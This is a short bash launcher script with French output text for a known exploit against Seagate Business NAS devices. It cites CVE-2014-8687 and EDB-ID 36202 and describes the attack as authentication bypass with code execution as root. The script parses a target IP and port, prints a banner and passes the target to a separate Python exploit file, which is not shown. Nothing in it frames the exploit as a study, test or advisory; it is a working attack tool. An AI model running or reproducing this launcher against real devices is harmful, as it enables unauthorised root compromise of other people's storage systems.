#!/bin/bash

cM="\033[1;33m"
cT="\033[1;34m"
cS="\033[1;34m"
cR="\033[0m"



if [ ${#1} -eq 0 ];then
	echo "Usage: $0 [IP] [PORT]"
	exit 0;
fi

if [ ${#2} -eq 0 ];then
	port=80 #8081
else 
	port=$2
fi


#format target
target=$1
target_starting_by=${target:0:5}
slashes=$(echo $(echo $target|grep -o '/')|sed "s/ //g")
nb_slashes=${#slashes}

#http://target/uri/....
#https://target/uri/....
if [[ "$target_starting_by" =~ "http" ]] || [[ "$target_starting_by" =~ "ftp" ]] ;then
	target=${target/*:\/\//}
fi
target=${target/\/*/}
ip=$target

echo -e "$cM[+] EXPLOIT:"
echo -e "$cM |_[-] DETAILS:$cT Authentification Seagate Business NAS et execution de code en tant que root . $cR"
echo -e "$cM |_[-] EDB-ID:$cT 36202 $cR"
echo -e "$cM |_[-] CVE:$cT 2014-8687 $cR"
echo -e "\n$cM[+] CIBLE $cR"
echo -e "$cM |_[-] IP:$cT $ip $cR"
echo -e "$cM |_[-] PORT:$cT $port $cR"

echo -e "\n$cM[+] ATTAQUE $cM"
python ./sbar.src $ip $port
echo -e "$cR"

exit
